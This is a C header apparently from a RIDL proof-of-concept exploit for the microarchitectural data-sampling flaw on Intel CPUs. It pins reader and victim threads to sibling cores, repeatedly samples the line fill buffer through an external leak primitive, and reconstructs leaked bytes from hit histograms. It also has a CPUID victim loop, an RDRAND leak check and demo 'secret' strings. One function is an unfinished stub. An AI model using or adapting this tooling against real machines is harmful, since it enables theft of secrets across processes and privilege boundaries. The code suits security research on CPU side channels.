#ifndef RIDL_UTILS_H
#define RIDL_UTILS_H

#include <stdio.h>
#include <fcntl.h>
#include <time.h>
#include <stdint.h>
#include <pthread.h>
#include <string.h>
#include "../primitives/basic_primitives.h"

#ifdef TSX_AVAILABLE
#define READ_SUCCESS_THRESHOLD 1000
#define REPS 5000
#else
#define READ_SUCCESS_THRESHOLD 3000
#define REPS 20000
#endif


#define TIMES_TEN(X) X X X X X X X X X X
int _page_size = 0x1000;
int writer_cpu = 3, reader_cpu = 7, offcore_cpu = 1, pid = 0, pid2 = 0;

int vector_hits[64][256];
uint8_t vector[64];
uint8_t byte_32;


inline uint64_t time_convert(struct timespec *spec) { return (1000000000 * (uint64_t) spec->tv_sec) + spec->tv_nsec; }

int sample_string_count = 4;
char *sample_strings[] = {
        "_The implications are worrisome.",
        "_This string is very secret. Don't read it!",
        "_You should not be able to read this.",
        "_These characters were obtained from *NULL.",
};

void set_processor_affinity(int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);

    pthread_t current_thread = pthread_self();
    pthread_setaffinity_np(current_thread, sizeof(cpu_set_t), &cpuset);
}

void get_same_core_cpus(int *a, int *b) {
    FILE *cpuinfo_fd = fopen("/proc/cpuinfo", "r");
    char *read_buffer = NULL;
    int empty = 0, core_num = 0;
    ssize_t len = 1024;
    while (getline(&read_buffer, &len, cpuinfo_fd)) {
        if (strlen(read_buffer) <= 1) {
            if (empty) break;
            empty = 1;
        } else empty = 0;
        if (strncmp(read_buffer, "core id", 7))
            continue;
        core_num++;
    }
    *a = (core_num / 2) - 1;
    *b = core_num - 1;
    fflush(stdout);
    fclose(cpuinfo_fd);
}

void fill_result_buffer(char* buffer, int start, int end){
    for (int k = start; k < end; k++) {
        int max = 0, max_i = -1;
        for (int i = 1; i < 256; i++) {
            if (vector_hits[k][i] > max) {
                max_i = i;
                max = vector_hits[k][i];
            }
        }

        if (max > (float) REPS / READ_SUCCESS_THRESHOLD) {
            buffer[k] = (char) max_i;
        } else {
            buffer[k] = '*';
        }
    }
}

void vector_read(void *mem, int _reps, char* buffer, int start, int end, int fill_complete_buffer) {
    set_processor_affinity(reader_cpu);
    memset(vector, 0, sizeof(vector[0]) * 64);
    memset(vector_hits, 0, sizeof(vector_hits[0][0]) * 256 * 64);
    int reps = _reps;
    while (reps--) {
        lfb_partial_vector_read(mem, vector, start, end);
        for (int i = start; i < end; i++) {
            int value = (int) vector[i];
#ifndef TSX_AVAILABLE
            if(value < 0xfe)
#endif
            vector_hits[i][value & 0xFF]++;
        }
    }
    if(fill_complete_buffer) fill_result_buffer(buffer, 0, 64);
    else fill_result_buffer(buffer, start, end);
}

uint8_t get_byte_32(){
    uint32_t ret;
    asm volatile(
            "mov $0x80000004, %%eax\n"
            "cpuid\n"
    : "=a" (ret)
    :);
    return (uint8_t)(ret & 0xFF);
}

int rdrand_section_changed(void* mem, uint8_t byte_32){
    int success = 0;
    for(int i = 0; i < REPS*3; i++){
        success += lfb_read_basic(mem, 32) == byte_32;
    }
    return success == 0;
}

inline void *victim_cpuid(uint32_t leaf, int cpu) {
    set_processor_affinity(cpu);
    while (1) {
        asm volatile(
        "mov %0, %%eax\n"
        "cpuid\n"
        ::"r"(leaf)
        : "eax", "ebx", "ecx", "edx");
    }
}

int cpuid_section_changed() {
    // TODO: Fill
}

#endif //RIDL_UTILS_H
